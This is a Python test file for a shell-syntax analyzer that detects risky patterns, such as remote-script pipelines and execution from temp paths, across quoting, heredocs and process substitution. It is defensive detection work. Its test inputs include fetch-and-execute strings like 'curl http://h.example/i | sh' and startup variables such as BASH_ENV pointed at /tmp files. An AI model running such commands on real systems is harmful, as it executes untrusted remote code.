"""Tests written to kill mutants that survived `tools/mutate.py --module shell_syntax`.

The survivors clustered in the quote-aware scanners (`_balanced`,
`_double_quote_end`, `_dollar`), here-document line accounting, process
substitution and the stdin-code paths: each had one covering test or none.
Every test names the behaviour a plausible fault would change.
"""
from __future__ import annotations

import unittest

from falsicore.shell_syntax import MAX_DEPTH, MAX_INPUT, MAX_TOKENS, analyze

REMOTE = "curl http://h.example/i | sh"


def patterns(text: str) -> list[str]:
    return analyze(text)["patterns"]


def limitations(text: str) -> list[str]:
    return analyze(text)["limitations"]


class BalancedScanningInsideSubstitutions(unittest.TestCase):
    """A `)` hidden in quotes or escaped must not end the substitution body (lines 97-109)."""

    def test_single_quoted_paren_inside_substitution(self):
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(f"x=$(echo ')' ; {REMOTE})"))

    def test_double_quoted_paren_inside_substitution(self):
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(f'x=$(echo ")" ; {REMOTE})'))

    def test_escaped_paren_inside_substitution(self):
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(f"x=$(echo \\) ; {REMOTE})"))

    def test_nested_parens_count_depth(self):
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(f"x=$(f $(g) $(h i) ; {REMOTE})"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("x=$( (cd /; /tmp/.a) )"))

    def test_backtick_inside_double_quotes_inside_substitution(self):
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(f'x=$(echo "`{REMOTE}`")'))

    def test_unterminated_quote_inside_substitution_is_a_limitation(self):
        for text in ("x=$(echo 'abc", 'x=$(echo "abc', "x=$(echo `abc", "x=$(echo abc"):
            self.assertIn("UNPARSED_QUOTING", limitations(text), text)
            self.assertEqual(patterns(text), [], text)

    def test_text_after_a_substitution_is_still_analysed(self):
        # The scanner must resume right after the closing paren, not one char late or early.
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("x=$(true);/tmp/.a"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("x=$(true) ; /tmp/.a"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("x=`true`;/tmp/.a"))


class DollarForms(unittest.TestCase):
    def test_arithmetic_expansion_as_command_head_is_unresolved(self):
        self.assertIn("EXPANSION_NOT_RESOLVED", limitations("$((1+2)) --flag"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("echo $((1+2)); /tmp/.a"))

    def test_brace_variable_keeps_its_name_for_the_sourcing_resolver(self):
        self.assertEqual(analyze(". ${HOME}/.extra")["sourced"], ["\x00VAR:HOME\x00/.extra"])
        self.assertEqual(analyze(". $HOME/.extra")["sourced"], ["\x00VAR:HOME\x00/.extra"])
        self.assertEqual(analyze(". ${1:-x}/.extra")["sourced"], ["\x00VAR:?\x00/.extra"])

    def test_ansi_c_quoting_is_literal_text(self):
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("$'/tmp/.a' --x"))
        self.assertEqual(patterns("echo $'curl http://h/i | sh'"), [])
        self.assertIn("UNPARSED_QUOTING", limitations("echo $'abc"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("$'/tmp/.a\\'b'"))   # escaped quote inside

    def test_bare_dollar_is_literal(self):
        self.assertEqual(patterns("echo $ ; echo 5$"), [])
        self.assertEqual(limitations("echo $ ; echo 5$"), [])


class DoubleQuotes(unittest.TestCase):
    def test_escapes_inside_double_quotes(self):
        self.assertEqual(limitations('echo "a\\$b \\` \\" \\\\"'), [])
        self.assertEqual(patterns('echo "a\\$b"'), [])

    def test_substitution_inside_double_quotes_is_analysed(self):
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(f'x="$({REMOTE})"'))
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(f'x="`{REMOTE}`"'))
        self.assertIn("EXPANSION_NOT_RESOLVED", limitations('"$cmd" --x'))

    def test_quoted_word_is_a_program_not_a_keyword(self):
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns('"/tmp/.a" --x'))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("'/tmp/.a' --x"))
        self.assertEqual(patterns('"done"'), [])      # a quoted keyword is a program named done, not in a temp path

    def test_newlines_inside_double_quotes_keep_line_numbers(self):
        result = analyze('x="a\nb\nc"\n/tmp/.a')
        self.assertEqual([m["line"] for m in result["matches"]], [4])
        result = analyze("x='a\nb'\n/tmp/.a")
        self.assertEqual([m["line"] for m in result["matches"]], [3])
        result = analyze("x=`true\ntrue`\n/tmp/.a")
        self.assertEqual([m["line"] for m in result["matches"]], [3])


class HereDocuments(unittest.TestCase):
    def test_lines_after_a_heredoc_are_numbered_correctly(self):
        result = analyze("cat <<EOF\na\nb\nEOF\n/tmp/.a")
        self.assertEqual([m["line"] for m in result["matches"]], [5])
        self.assertEqual(result["limitations"], [])

    def test_dash_form_strips_leading_tabs_from_the_terminator(self):
        result = analyze("cat <<-EOF\n\tbody\n\tEOF\n/tmp/.a")
        self.assertEqual([m["line"] for m in result["matches"]], [4])
        self.assertEqual(result["limitations"], [])
        plain = analyze("cat <<EOF\n\tbody\n\tEOF\n/tmp/.a")       # without '-' the tabbed EOF does not terminate
        self.assertIn("UNTERMINATED_HEREDOC", plain["limitations"])

    def test_heredoc_body_is_code_for_a_shell_on_stdin(self):
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(f"sh <<EOF\n{REMOTE}\nEOF\n"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("python3 - <<EOF\nimport os\nEOF\n/tmp/.a"))

    def test_quoted_delimiter_suppresses_expansion_gap(self):
        self.assertIn("HEREDOC_EXPANSION_NOT_RESOLVED", limitations("sh <<EOF\n$x\nEOF\n"))
        self.assertNotIn("HEREDOC_EXPANSION_NOT_RESOLVED", limitations("sh <<'EOF'\n$x\nEOF\n"))
        self.assertNotIn("HEREDOC_EXPANSION_NOT_RESOLVED", limitations("sh <<\\EOF\n$x\nEOF\n"))
        self.assertNotIn("HEREDOC_EXPANSION_NOT_RESOLVED", limitations('sh << "EOF"\n$x\nEOF\n'))

    def test_unterminated_heredoc_variants(self):
        self.assertIn("UNTERMINATED_HEREDOC", limitations("cat <<EOF\nabc"))
        self.assertIn("UNTERMINATED_HEREDOC", limitations("cat <<EOF"))
        self.assertIn("UNPARSED_QUOTING", limitations("cat << ;"))

    def test_two_heredocs_on_one_line(self):
        result = analyze("cat <<A <<B\na\nA\nb\nB\n/tmp/.a")
        self.assertEqual([m["line"] for m in result["matches"]], [6])


class ProcessSubstitution(unittest.TestCase):
    def test_procsub_body_feeds_code_readers(self):
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns("python3 <(curl http://h/p)"))
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns("source <(curl http://h/p)"))
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns("bash <(wget -qO- http://h/p)"))
        self.assertEqual(patterns("diff <(ls) <(ls -a)"), [])

    def test_unterminated_procsub_is_a_limitation(self):
        self.assertIn("UNPARSED_QUOTING", limitations("cat <(curl http://h/p"))

    def test_text_after_procsub_is_still_analysed(self):
        result = analyze("cat <(true)\n/tmp/.a")
        self.assertIn("TEMP_PATH_IN_EXECUTION", result["patterns"])
        self.assertEqual([m["line"] for m in result["matches"]], [2])
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("cat <(true); /tmp/.a"))   # same line, next command
        self.assertEqual(patterns("cat <(true) /tmp/.a"), [])                           # an argument is not executed

    def test_procsub_newlines_keep_line_numbers(self):
        result = analyze("cat <(true\ntrue)\n/tmp/.a")
        self.assertEqual([m["line"] for m in result["matches"]], [3])


class NestingAndBounds(unittest.TestCase):
    def test_nesting_limit_is_reported_and_deep_code_is_not_guessed(self):
        deep = REMOTE
        for _ in range(MAX_DEPTH + 2):
            deep = f"echo $({deep})"
        result = analyze(deep)
        self.assertIn("NESTING_LIMIT", result["limitations"])
        shallow = REMOTE
        for _ in range(MAX_DEPTH - 1):
            shallow = f"echo $({shallow})"
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(shallow))

    def test_input_limit_is_exact(self):
        # Comment lines produce no tokens, so only the byte bound is exercised, not MAX_TOKENS.
        filler = ("# " + "a" * 998 + "\n") * (MAX_INPUT // 1000 + 1)
        head = filler[:MAX_INPUT - len("\n/tmp/.a")]
        if not head.endswith("\n"):
            head = head[:head.rfind("\n") + 1] + "#" * (MAX_INPUT - len("\n/tmp/.a") - head.rfind("\n") - 1)
        text = head + "\n/tmp/.a"
        self.assertEqual(len(text), MAX_INPUT)
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns(text))
        self.assertNotIn("INPUT_LIMIT", limitations(text))
        self.assertIn("INPUT_LIMIT", limitations("#" + text))
        self.assertNotIn("TEMP_PATH_IN_EXECUTION", patterns("#" + text))   # the tail was cut, not guessed

    def test_token_limit(self):
        many = "a " * (MAX_TOKENS + 10)
        self.assertIn("TOKEN_LIMIT", limitations(many))
        self.assertNotIn("TOKEN_LIMIT", limitations("a " * 100))


class CommandValuedSettings(unittest.TestCase):
    def test_prompt_command_and_env_values(self):
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(f"PROMPT_COMMAND='{REMOTE}'"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("BASH_ENV=/tmp/.a"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("export ENV=/dev/shm/.a"))
        self.assertIn("EXPANSION_NOT_RESOLVED", limitations("export BASH_ENV=$X"))
        self.assertEqual(patterns("export PATH=/tmp/.a:$PATH"), [])   # PATH is not executed


class ShellInvocationForms(unittest.TestCase):
    def test_shell_operands(self):
        self.assertIn("MISSING_SHELL_COMMAND_OPERAND", limitations("sh -c"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("bash /tmp/.a"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("sh - < /tmp/.a"))
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("sh -s < /tmp/.a"))
        self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(f"sh -s <<< '{REMOTE}'"))
        self.assertIn("EXPANSION_NOT_RESOLVED", limitations("python3 - < $FILE"))
        self.assertEqual(patterns("sh -c 'echo ok'"), [])
        self.assertIn("EXPANSION_NOT_RESOLVED", limitations("bash -lc \"$cmd\""))

    def test_interpreter_script_operands(self):
        self.assertIn("TEMP_PATH_IN_EXECUTION", patterns("python3 /tmp/.a.py"))
        self.assertIn("EXPANSION_NOT_RESOLVED", limitations("python3 $SCRIPT"))
        self.assertEqual(patterns("python3 -m venv .venv"), [])
        self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED", limitations("perl -e 'print 1'"))
        self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED", limitations("node --eval 'x'"))


class CriticalLexerAndOperandBoundaries(unittest.TestCase):
    def test_lexical_depth_limit_is_exact_and_fail_closed(self):
        from falsicore.shell_syntax import _NestingLimit, _balanced, _double_quote_end
        self.assertEqual(_balanced(")", 0, nesting=47), 1)
        self.assertEqual(_double_quote_end('"', 0, nesting=47), 1)
        with self.assertRaises(_NestingLimit):
            _balanced(")", 0, nesting=48)
        with self.assertRaises(_NestingLimit):
            _double_quote_end('"', 0, nesting=48)
        with self.assertRaises(_NestingLimit):
            _balanced("(" * 47 + ")" * 48, 0)

    def test_inline_code_taint_is_bound_to_the_actual_operand(self):
        for code in (
            'python3 -c "$(curl http://h/i)"',
            'node --eval "$(curl http://h/i)"',
            'perl -e "$(curl http://h/i)"',
        ):
            with self.subTest(code=code):
                self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(code))
        for data_only in (
            'python3 -c "print(1)" abc "$(curl http://h/i)"',
            'python3 -c "print(1)" "$(curl http://h/i)"',
            'node --eval "let x=1" "$(curl http://h/i)"',
        ):
            with self.subTest(code=data_only):
                self.assertNotIn("REMOTE_SCRIPT_PIPELINE", patterns(data_only))


if __name__ == "__main__":
    unittest.main()
